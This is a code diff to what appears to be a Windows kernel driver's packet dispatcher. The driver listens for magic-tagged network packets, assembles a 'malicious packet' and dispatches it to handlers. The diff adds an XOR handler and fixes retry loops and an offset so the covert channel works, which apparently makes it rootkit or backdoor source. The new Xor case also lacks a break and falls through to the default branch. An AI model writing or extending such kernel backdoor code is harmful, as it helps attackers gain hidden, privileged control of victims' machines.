@@ -6,6 +6,7 @@
  */
 #include "PacketDispatch.h"
 #include "PingPacketHandler.h"
+#include "XorPacketHandler.h"
 
 /**
 	Populate the necessary members in the PacketDispatch class.
@@ -130,7 +131,7 @@ PacketDispatch::SendSynchronousAfdRequest (
 	//
 	if (status == STATUS_PENDING)
 	{
-		ZwWaitForSingleObject(socketEventHandle, TRUE, NULL);
+		ZwWaitForSingleObject(socketEventHandle, FALSE, NULL);
 		status = IoStatusBlock->Status;
 	}
 
@@ -442,9 +443,11 @@ PacketDispatch::PopulateBasePacket (
 				DBGPRINT("PacketDispatch!PopulateBasePacket: Failed to receive rest of base packet.");
 				return STATUS_NO_MEMORY;
 			}
+
+			DBGPRINT("PacketDispatch!PopulateBasePacket: Retrieved %i bytes for rest of base packet.", bytesReceived);
 			bytesAfterMagic += bytesReceived;
 			receiveRetryCount++;
-		} while (bytesAfterMagic < sizeof(BASE_PACKET) || receiveRetryCount >= MaxReceiveRetry);
+		} while (bytesAfterMagic < sizeof(BASE_PACKET) && receiveRetryCount < MaxReceiveRetry);
 
 		//
 		// If we failed to receive the rest of the BASE_PACKET after the maximum
@@ -504,7 +507,7 @@ PacketDispatch::PopulateMaliciousPacket (
 	{
 		memcpy_s(RCAST<PVOID>(RCAST<ULONG64>(FullBasePacket) + sizeof(BASE_PACKET)),
 				 remainingMaliciousBytes,
-				 RCAST<PVOID>(RCAST<ULONG64>(Packet) + PacketMagicOffset + sizeof(BASE_PACKET)),
+				 RCAST<PVOID>(RCAST<ULONG64>(Packet) + PacketMagicOffset + MAGIC_SIZE + sizeof(BASE_PACKET)),
 				 RemainingBytes);
 
 		//
@@ -552,7 +555,7 @@ PacketDispatch::PopulateMaliciousPacket (
 			//
 			remainingMaliciousBytes -= bytesReceived;
 			receiveRetryCount++;
-		} while (remainingMaliciousBytes > 0 || receiveRetryCount >= MaxReceiveRetry);
+		} while (remainingMaliciousBytes > 0 && receiveRetryCount < MaxReceiveRetry);
 
 		//
 		// If we failed to receive the rest of the BASE_PACKET after the maximum
@@ -620,8 +623,6 @@ PacketDispatch::Process (
 		goto Exit;
 	}
 
-	DBGPRINT("PacketDispatch!Process: Received full packet with type %i, dispatching.", fullBasePacket->Type);
-
 	result = this->Dispatch(fullBasePacket);
 Exit:
 	if (fullBasePacket)
@@ -646,10 +647,13 @@ PacketDispatch::Dispatch (
 	ULONG handlerTag;
 
 	PPING_PACKET_HANDLER pingHandler;
+	PXOR_PACKET_HANDLER xorHandler;
 
 	handler = NULL;
 	handlerTag = 0;
 	status = STATUS_NO_MEMORY;
+
+	DBGPRINT("PacketDispatch!Dispatch: Received full packet with type %i, dispatching.", FullPacket->Type);
 
 	//
 	// First, set the proper handler and its tag by the Type fron the FullPacket.
@@ -661,6 +665,10 @@ PacketDispatch::Dispatch (
 		handler = pingHandler;
 		handlerTag = PING_PACKET_HANDLER_TAG;
 		break;
+	case Xor:
+		xorHandler = new (NonPagedPool, XOR_PACKET_HANDLER_TAG) XorPacketHandler(this);
+		handler = xorHandler;
+		handlerTag = XOR_PACKET_HANDLER_TAG;
 	default:
 		status = STATUS_NOT_SUPPORTED;
 		break;
